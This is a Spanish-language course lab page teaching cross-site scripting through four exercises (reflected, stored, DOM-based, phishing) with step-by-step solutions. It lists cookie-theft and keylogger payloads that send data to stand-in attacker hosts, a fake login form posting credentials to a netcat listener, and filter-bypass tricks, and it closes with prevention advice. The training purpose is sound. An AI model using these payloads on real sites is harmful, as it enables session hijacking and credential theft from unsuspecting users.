---
title: "Lab - Cross-Site Scripting (XSS)"
date: "2026-10-08"
author: "Manuel FR"
tags:
  - ifct0109
  - poc
  - vulnerabilidades-web
  - web
  - vulnweb
  - xss
---

> [[02 - MODULOS/05 - Prácticas (PoCs)|← Volver a Prácticas (PoCs)]] | [[02 - MODULOS/Prácticas (PoCs)/Vulnerabilidades Web/00 - Índice del Módulo Vulnerabilidades Web|Índice del Módulo]]

---
# Lab - Cross-Site Scripting (XSS)

# ⚡ Cross-Site Scripting (XSS)

 

## Inyección de JavaScript en Aplicaciones Web

 
 
 

## 📚 ¿Qué es Cross-Site Scripting (XSS)?

 

**Cross-Site Scripting (XSS)** es una vulnerabilidad de seguridad que permite a un atacante inyectar código JavaScript malicioso en páginas web vistas por otros usuarios. Cuando la víctima carga la página comprometida, el código se ejecuta en su navegador como si fuera parte legítima de la aplicación.
 
 

Esta vulnerabilidad surge cuando una aplicación web:
 

 
* Incluye datos no confiables en una página web sin validación o escapado adecuado
 
* Actualiza el DOM usando JavaScript con datos controlados por el atacante
 
* Permite que entrada del usuario se ejecute como código en el navegador
 

 

> [!note]
> 
 **⚠️ Impacto:** XSS permite robo de sesiones, phishing, defacement, redirecciones maliciosas, keylogging y ejecución de acciones en nombre del usuario víctima. Es una de las vulnerabilidades más comunes y peligrosas en aplicaciones web modernas.
> 

 

 
 
 

## 🧪 Laboratorios Prácticos

 

Completa estos laboratorios progresivos para dominar la explotación de XSS:

 
 
 
 

### Lab 1: Reflected XSS Básico

 FÁCIL
 
 
 

 Este laboratorio contiene una vulnerabilidad de XSS reflejado en la funcionalidad de búsqueda. La aplicación toma la entrada del usuario y la refleja en la respuesta sin ningún tipo de filtrado o escapado.
 
 
 
 **🎯 Objetivo:** Inyecta un payload de JavaScript que muestre una alerta con el mensaje "XSS" para resolver el laboratorio.
 
 
 
 🚀 Acceder al Laboratorio
 
 
 
 
 💡 Ver Solución
 ▼
 
 
 

#### Solución Paso a Paso:

 

 
1. Accede al laboratorio y encuentra el formulario de búsqueda
 
2. Prueba con una búsqueda normal para ver cómo se refleja la entrada
 
3. Observa que tu búsqueda aparece en la página sin filtrado
 
4. Inyecta el siguiente payload en el campo de búsqueda:
 

 
 

#### Payload básico:

 
<script>alert('XSS')</script>
 
 
 

#### Payloads alternativos si el básico no funciona:

 
<img src=x onerror=alert('XSS')>

<svg onload=alert('XSS')>

<body onload=alert('XSS')>

<iframe src="javascript:alert('XSS')">
 
 
 

**Resultado esperado:** Al enviar el payload, deberías ver una alerta de JavaScript con el mensaje "XSS" en tu navegador.
 
 

> [!note]
> 
 **💡 Concepto clave:** Este es un XSS reflejado porque el payload se refleja inmediatamente en la respuesta. No se almacena en ninguna base de datos. El atacante necesita engañar a la víctima para que haga clic en un enlace malicioso.
> 

 
 
 

 
 
 

### Lab 2: Stored XSS en Libro de Visitas

 FÁCIL
 
 
 

 Este laboratorio contiene un sistema de libro de visitas donde los usuarios pueden dejar mensajes públicos. Los mensajes se almacenan en el servidor y se muestran a todos los visitantes. La aplicación no escapa correctamente el HTML al mostrar los mensajes, creando una vulnerabilidad de Stored XSS (XSS Persistente).
 
 
 
 **🎯 Objetivo:** Inyecta un payload XSS que se almacene en el servidor y se ejecute automáticamente cuando cualquier usuario visite la página del libro de visitas. Demuestra el ataque mostrando una alerta con el mensaje "XSS".
 
 
 
 🚀 Acceder al Laboratorio
 
 
 
 
 💡 Ver Solución
 ▼
 
 
 

#### Solución Paso a Paso:

 

 
1. Accede al laboratorio y observa el formulario del libro de visitas
 
2. Publica un mensaje normal (ej: "Hola mundo") para entender el comportamiento
 
3. Observa que tu mensaje aparece en la lista de mensajes
 
4. Recarga la página - el mensaje sigue ahí (se almacena en el servidor)
 
5. Ahora inyecta un payload XSS en el campo "Mensaje"
 

 
 

#### Payload básico:

 
<script>alert('XSS')</script>
 
 
 

#### Rellenar el formulario:

 

 
* **Nombre:** Tu nombre (ej: "Hacker")
 
* **Email:** (opcional)
 
* **Mensaje:** `<script>alert('XSS')</script>`
 

 
 

#### Payloads alternativos:

 
# Usando img tag

<img src=x onerror=alert('XSS')>

# Usando svg

<svg onload=alert('XSS')>

# Más llamativo - cambiar la página

<script>document.body.innerHTML='<h1 style="color:red">HACKED!</h1>'</script>

# Redirect

<script>window.location='http://evil.com'</script>
 
 
 

#### Resultado esperado:

 

Después de publicar el payload:
 

 
* ✅ Se muestra una alerta "XSS" inmediatamente
 
* ✅ El mensaje malicioso se guarda en `messages.json`
 
* ✅ CADA VEZ que alguien visita la página, el script se ejecuta
 
* ✅ Afecta a TODOS los visitantes, no solo a ti
 

 
 

#### Diferencias con Reflected XSS:

 
 
 
 
 
 
 
 
 
 
 **Persistencia**
 
 
 
 
 **Almacenamiento**
 
 
 
 
 **Víctimas**
 
 
 
 
 **Ingeniería Social**
 
 
 
 
 **Severidad**
 
 
 
 
 

| Característica | Reflected XSS | Stored XSS |
| --- | --- | --- |
| | No persistente | Persistente ✅ |
| | Solo en URL/Request | En servidor (BD/archivo) |
| | Solo quien hace clic | TODOS los visitantes ✅ |
| | Necesaria | NO necesaria ✅ |
| | Media-Alta | Alta-Crítica ✅ |

 
 

#### Escenario de ataque real:

 
1. Atacante publica mensaje con payload XSS

2. Payload se guarda en messages.json del servidor

3. Usuario legítimo visita el libro de visitas

4. El servidor carga messages.json y muestra todos los mensajes

5. El navegador del usuario ejecuta el payload malicioso

6. Atacante puede: robar cookies, redirigir, keylogger, etc.
 
 
 

#### Payload avanzado - Robo de cookies:

 
<script>

// Enviar cookies al servidor del atacante

fetch('http://atacante.com/steal?c=' + document.cookie);

</script>
 
 
 

> [!note]
> 
 **💡 Concepto clave:** Stored XSS es más peligroso que Reflected XSS porque:
> 

> 
> * El payload se almacena permanentemente en el servidor
> 
> * Se ejecuta automáticamente para TODOS los visitantes
> 
> * No requiere que la víctima haga clic en un enlace malicioso
> 
> * Puede permanecer activo durante meses si no se detecta
> 

> Esta vulnerabilidad surge porque la aplicación guarda el contenido del usuario sin sanitización y lo muestra sin escapar los caracteres HTML especiales.
> 

 
 
 

 
 
 

### Lab 3: DOM-based XSS en Dashboard

 FÁCIL
 
 
 

 Este laboratorio contiene un panel de control (dashboard) que lee el nombre del usuario desde el fragmento de URL (hash) y lo muestra dinámicamente usando JavaScript. La aplicación utiliza `innerHTML` sin sanitización para renderizar el contenido, creando una vulnerabilidad de DOM-based XSS.
 
 
 
 **🎯 Objetivo:** Explota la vulnerabilidad DOM-based XSS para ejecutar JavaScript en el contexto del navegador. Primero demuestra el ataque con una alerta simple, luego intenta robar las cookies de sesión del usuario.
 
 
 
 🚀 Acceder al Laboratorio
 
 
 
 
 💡 Ver Solución
 ▼
 
 
 

#### ¿Qué es DOM-based XSS?

 

**DOM-based XSS** es un tipo especial de Cross-Site Scripting donde la vulnerabilidad está completamente del lado del cliente (JavaScript). A diferencia de Reflected y Stored XSS, el payload **nunca llega al servidor** - todo el ataque ocurre en el navegador.
 
 

#### Características del DOM-based XSS:

 

 
* ✅ El payload está en el **fragmento de URL** (después del `#`)
 
* ✅ El servidor **nunca ve el payload** (el # no se envía en las peticiones HTTP)
 
* ✅ La vulnerabilidad está en el **código JavaScript**, no en el backend
 
* ✅ JavaScript lee de fuentes no confiables: `location.hash`, `location.search`, etc.
 
* ✅ JavaScript inyecta sin sanitizar en: `innerHTML`, `eval()`, `document.write()`
 

 
 

#### Solución Paso a Paso:

 

 
1. Accede al laboratorio - observa el dashboard profesional
 
2. El dashboard espera un nombre de usuario en la URL
 
3. Formato esperado: `lab3.php#user=TuNombre`
 
4. Prueba primero con un nombre normal
 
5. Luego inyecta payloads XSS en el parámetro `user`
 

 
 

#### Paso 1: Prueba normal

 
lab3.php#user=Maria
 
 

Deberías ver: "¡Bienvenido/a Maria!" en el dashboard y la inicial "M" en el avatar.
 
 

#### Paso 2: Inyectar XSS básico

 
# Payload 1: Usando img tag (MÁS EFECTIVO) ✅

lab3.php#user=<img src=x onerror=alert('XSS')>

# Payload 2: Usando svg

lab3.php#user=<svg onload=alert('XSS')>

# Payload 3: Usando script tag

lab3.php#user=<script>alert('XSS')</script>

# Payload 4: Combinado con nombre

lab3.php#user=Juan<img src=x onerror=alert('XSS')>
 
 
 

#### Resultado esperado:

 

Deberías ver una alerta emergente con el mensaje "XSS" cuando la página cargue.
 
 

#### Paso 3: Robo de cookies (Account Takeover - ATO)

 
 

> [!note]
> 
 **⚠️ Account Takeover (ATO):** Es un ataque donde un atacante obtiene acceso no autorizado a la cuenta de un usuario legítimo, típicamente robando sus credenciales de sesión (cookies). Con la cookie de sesión, el atacante puede:
> 

> 
> * Suplantar la identidad del usuario
> 
> * Acceder a sus datos privados
> 
> * Realizar acciones en su nombre
> 
> * Cambiar configuraciones de la cuenta
> 

> 

 
 

#### Payload para robar cookies:

 
# Enviar cookies al servidor del atacante

lab3.php#user=<img src=x onerror="fetch('http://atacante.com?c='+document.cookie)">

# Alternativa: Usando new Image()

lab3.php#user=<img src=x onerror="new Image().src='http://atacante.com?c='+document.cookie">

# Ver las cookies en consola (para demostración)

lab3.php#user=<img src=x onerror="alert(document.cookie)">
 
 
 

#### ¿Cómo funciona el robo de cookies?

 
1. Atacante crea URL maliciosa con payload XSS

2. Víctima hace clic en el enlace (ingeniería social)

3. Navegador carga la página con el hash malicioso

4. JavaScript lee location.hash y lo inyecta en innerHTML

5. El navegador ejecuta el código malicioso

6. El código envía document.cookie al servidor del atacante

7. Atacante recibe: session_id=SESS_abc123; user_role=admin

8. Atacante usa la cookie para suplantar al usuario (ATO)
 
 
 

#### Escenario real de ataque:

 
# 1. Atacante prepara la URL maliciosa

https://vulnerable-site.com/dashboard#user=<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

# 2. Atacante envía por email/chat a la víctima:

"Hola! Mira tu nuevo dashboard personalizado: [URL]"

# 3. Víctima hace clic → Sus cookies se envían al atacante

# 4. Atacante recibe en evil.com/steal:

?c=session_id=SESS_f3a8b2c1d4e5; user_role=admin

# 5. Atacante usa las cookies robadas para entrar como la víctima
 
 
 

#### Cookies generadas en este lab:

 

El laboratorio genera automáticamente estas cookies al cargar:
 

 
* `session_id` - Identificador único de sesión
 
* `user_role` - Rol del usuario (admin, user, etc.)
 

 

Puedes verlas ejecutando en la consola del navegador: `document.cookie`
 
 

#### Diferencias entre tipos de XSS:

 
 
 
 
 
 
 
 
 
 
 
 **¿Llega al servidor?**
 
 
 
 
 
 **Se almacena**
 
 
 
 
 
 **Vulnerabilidad en**
 
 
 
 
 
 **Detectable por WAF**
 
 
 
 
 
 **Logs del servidor**
 
 
 
 
 
 

| Característica | Reflected | Stored | DOM-based |
| --- | --- | --- | --- |
| | ✅ Sí | ✅ Sí | ❌ No (solo #hash) |
| | ❌ No | ✅ Sí (BD) | ❌ No |
| | Backend (PHP) | Backend (PHP) | Frontend (JS) |
| | ✅ Sí | ✅ Sí | ❌ Difícil |
| | ✅ Visible | ✅ Visible | ❌ No visible |

 
 

> [!note]
> 
 **💡 Concepto clave:** DOM-based XSS es especialmente peligroso porque:
> 

> 
> * El payload viaja en el fragmento (#) que nunca se envía al servidor
> 
> * Los WAF (Web Application Firewall) no pueden detectarlo
> 
> * No aparece en los logs del servidor
> 
> * La vulnerabilidad está en JavaScript, más difícil de auditar
> 
> * Puede combinarse con ingeniería social muy efectivamente
> 

> **Prevención:** Nunca usar `innerHTML`, `eval()` o `document.write()` con datos de `location.hash`, `location.search` u otras fuentes no confiables. Usar `textContent` en su lugar, o sanitizar con DOMPurify.
> 

 
 
 

 
 
 

### Lab 4: XSS Phishing

 FÁCIL
 

 

 En este laboratorio hay una vulnerabilidad XSS de tipo DOM que permite hacer un defacing a la WEB para capturar las credenciales de acceso.
 

 
 **🎯 Objetivo:** Realizar un defacing de una web bancaria para robar las credenciales de acceso.
 

 
 🚀 Acceder al Laboratorio
 

 
 
 💡 Ver Solución
 ▼
 
 
 

#### Solución Paso a Paso:

 

 
1. Rellenar los datos para realizar una consulta y enviar dicha consulta
 
2. Observa en la parte de la dirección el parámetro name e inserta el payload: 
lab4.php?name=`<script>alert('xss')</script>`
 
3. Una vez localizada la vulnerabilidad probamos a hacer el defacing. 
lab4.php?name=`<script>document.body.innerHTML=''</script>`
 
4. Ponemos Kali en escucha en el puerto 8000 con nc o con un servidor web de python: 
`nc -lvnp 8000`
 
5. Usamos el siguiente payload para crar el formulario de login: Recuerda modificar la **IP de tu Kali**

 `<script>document.body.innerHTML='<h3>Introduce tus credenciales</h3> <form action=http://**IP_KALI**:8000>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Login"></br>'</script>`
			
 

		
 

**Resultado esperado:** El enlace final se envía a la víctima que al poner sus credenciales son recibidas en Kali.
 
 

 
 

> [!note]
> 
 
> **🚧 Más laboratorios próximamente...**
> 

 

 
 
 

## 🔍 Tipos de XSS

 

Existen tres tipos principales de vulnerabilidades XSS:

 

### 1. Reflected XSS (XSS Reflejado)

 

El código malicioso proviene de la petición HTTP actual y se refleja inmediatamente en la respuesta.
 
# URL con XSS reflejado:

https://ejemplo.com/search?q=<script>alert('XSS')</script>

# La aplicación refleja directamente:

Resultados para: <script>alert('XSS')</script>
 
 

**Características:**
 

 
* No persistente - solo afecta al usuario que hace clic en el enlace malicioso
 
* Requiere ingeniería social para que la víctima acceda a la URL
 
* El payload viaja en la URL o en parámetros POST
 
* Más común en formularios de búsqueda, mensajes de error, campos de entrada
 

 

### 2. Stored XSS (XSS Almacenado/Persistente)

 

El código malicioso se almacena en el servidor (base de datos, archivos, etc.) y se ejecuta cada vez que un usuario accede a la página afectada.
 
# Ejemplo: Comentario en un blog

Comentario: <script>fetch('http://atacante.com/steal?c='+document.cookie)</script>

# Se guarda en la BD y se ejecuta para TODOS los usuarios que vean el comentario
 
 

**Características:**
 

 
* Persistente - afecta a todos los usuarios que visiten la página
 
* Más peligroso que Reflected XSS
 
* Común en: comentarios, perfiles de usuario, foros, mensajes privados
 
* No requiere que la víctima haga clic en un enlace especial
 

 

### 3. DOM-based XSS (XSS basado en DOM)

 

La vulnerabilidad existe en el código JavaScript del lado del cliente. El payload nunca llega al servidor.
 
// Código JavaScript vulnerable:

var search = location.hash.substring(1);

document.write("Buscaste: " + search);

// URL maliciosa:

https://ejemplo.com/page#<script>alert('XSS')</script>
 
 

**Características:**
 

 
* El payload está en el fragmento de URL (#) que no se envía al servidor
 
* La vulnerabilidad está en el código JavaScript del cliente
 
* Más difícil de detectar con herramientas tradicionales
 
* Común en aplicaciones SPA (Single Page Applications)
 

 

 
 

## 🎯 Vectores de Ataque y Payloads

 
 

### Payloads Básicos:

 
<script>alert('XSS')</script>

<script>alert(document.domain)</script>

<script>alert(document.cookie)</script>

<script src="http://atacante.com/malicious.js"></script>
 

 

### Event Handlers (Manejadores de Eventos):

 
<img src=x onerror=alert('XSS')>

<svg onload=alert('XSS')>

<body onload=alert('XSS')>

<input onfocus=alert('XSS') autofocus>

<marquee onstart=alert('XSS')>

<details open ontoggle=alert('XSS')>
 

 

### Sin Event Handlers:

 
<iframe src="javascript:alert('XSS')">

<object data="javascript:alert('XSS')">

<embed src="javascript:alert('XSS')">

<a href="javascript:alert('XSS')">Click</a>
 

 

### Robo de Cookies:

 
<script>

fetch('http://atacante.com/steal?c='+document.cookie);

</script>

<img src=x onerror="fetch('http://atacante.com/steal?c='+document.cookie)">
 

 

### Keylogger:

 
<script>

document.onkeypress = function(e) {

  fetch('http://atacante.com/log?key=' + e.key);

}

</script>
 

 

### Redirección Maliciosa:

 
<script>window.location='http://sitio-malicioso.com'</script>

<meta http-equiv="refresh" content="0;url=http://sitio-malicioso.com">
 
 

 
 

## 🎭 Técnicas de Ofuscación y Bypass

 

Los atacantes utilizan diversas técnicas para evadir filtros:

 

### 1. Codificación de Caracteres

 
# HTML Entities

&lt;script&gt;alert('XSS')&lt;/script&gt;

# URL Encoding

%3Cscript%3Ealert('XSS')%3C/script%3E

# Unicode

\u003cscript\u003ealert('XSS')\u003c/script\u003e

# Hex

\x3cscript\x3ealert('XSS')\x3c/script\x3e
 

 

### 2. Mayúsculas/Minúsculas y Espacios

 
<ScRiPt>alert('XSS')</sCrIpT>

<script  >alert('XSS')</script>

<script	>alert('XSS')</script> (tab)

<script
>alert('XSS')</script> (newline)
 

 

### 3. Etiquetas Alternativas

 
# Si <script> está bloqueado:

<img src=x onerror=alert('XSS')>

<svg/onload=alert('XSS')>

<iframe src=javascript:alert('XSS')>

<math><mtext></mtext></math><script>alert('XSS')</script>
 

 

### 4. Comentarios y Null Bytes

 
<scr<!--ipt>alert('XSS')</scr-->ipt>

<scr\x00ipt>alert('XSS')</scr\x00ipt>
 

 

### 5. JavaScript Ofuscado

 
// Usando eval

<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>

// Usando template literals

<script>alert`XSS`</script>

// Sin paréntesis

<script>onerror=alert;throw 'XSS'</script>
 

 

### 6. Bypass de Filtros de Palabras Clave

 
# Si "alert" está filtrado:

<script>window['al'+'ert']('XSS')</script>

<script>top['al\x65rt']('XSS')</script>

<script>eval('al'+'ert("XSS")')</script>

<script>Function('ale'+'rt("XSS")')()</script>
 

 

### 7. Contextos Especiales

 
# Dentro de atributos HTML:

" onmouseover="alert('XSS')

' onmouseover='alert('XSS')

# Dentro de JavaScript:

';alert('XSS');//

';alert('XSS');var a='

# Dentro de CSS:

<style>@import'javascript:alert("XSS")';</style>

<div style="background:url('javascript:alert(XSS)')">
 
 

 
 

## 🔬 Contextos de Inyección

 

El payload necesario depende del contexto donde se inyecta:

 

### 1. HTML Body

 
<div>Tu búsqueda: ENTRADA_USUARIO</div>

Payload: <script>alert('XSS')</script>
 

 

### 2. Atributo HTML

 
<input value="ENTRADA_USUARIO">

Payload: " onmouseover="alert('XSS')
 

 

### 3. Dentro de JavaScript

 
<script>var search = 'ENTRADA_USUARIO';</script>

Payload: '; alert('XSS'); //
 

 

### 4. Dentro de Event Handler

 
<div onclick="buscar('ENTRADA_USUARIO')">

Payload: '); alert('XSS'); //
 

 

### 5. Dentro de URL

 
<a href="https://ejemplo.com/search?q=ENTRADA_USUARIO">

Payload: javascript:alert('XSS')
 
 

 
 

## 🛡️ Prevención de XSS

 
 

### 1. Escapado de Salida (Output Encoding)

 

La defensa principal es escapar TODA la entrada del usuario antes de incluirla en HTML:
 
// PHP

echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');

// JavaScript

element.textContent = userInput; // Seguro

element.innerHTML = userInput; // INSEGURO

// Python (Flask/Jinja2)

{{ user_input | e }}

// Java

import org.apache.commons.text.StringEscapeUtils;

StringEscapeUtils.escapeHtml4(userInput);
 

 

### 2. Content Security Policy (CSP)

 

CSP permite restringir qué scripts pueden ejecutarse:
 
# Header HTTP:

Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.ejemplo.com

# Meta tag HTML:

<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
 

 

### 3. Validación de Entrada

 

 
* Usar listas blancas (whitelist) de caracteres permitidos
 
* Validar formato y tipo de datos esperados
 
* Rechazar entrada que contenga caracteres HTML/JS
 

 

### 4. HttpOnly Cookies

 

Previene que JavaScript acceda a las cookies de sesión:
 
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
 

 

### 5. Sanitización con Librerías

 
// JavaScript - DOMPurify

import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(userInput);

// PHP - HTML Purifier

$config = HTMLPurifier_Config::createDefault();

$purifier = new HTMLPurifier($config);

$clean = $purifier->purify($userInput);
 

 

### 6. Frameworks Modernos

 

Frameworks como React, Angular y Vue.js escapan automáticamente por defecto:
 
// React - Seguro por defecto

<div>{userInput}</div>

// INSEGURO - Evitar

<div dangerouslySetInnerHTML={{__html: userInput}}</div>
 

 

### 7. X-XSS-Protection Header

 
X-XSS-Protection: 1; mode=block
 
 

 
 

**🛡️ VulnWeb Lab** - Laboratorio de Vulnerabilidades Web
 

© 2025 - Entorno Educativo IFCT0109

---

> [[02 - MODULOS/05 - Prácticas (PoCs)|← Volver a Prácticas (PoCs)]] | [[02 - MODULOS/Prácticas (PoCs)/Vulnerabilidades Web/00 - Índice del Módulo Vulnerabilidades Web|Índice del Módulo]]
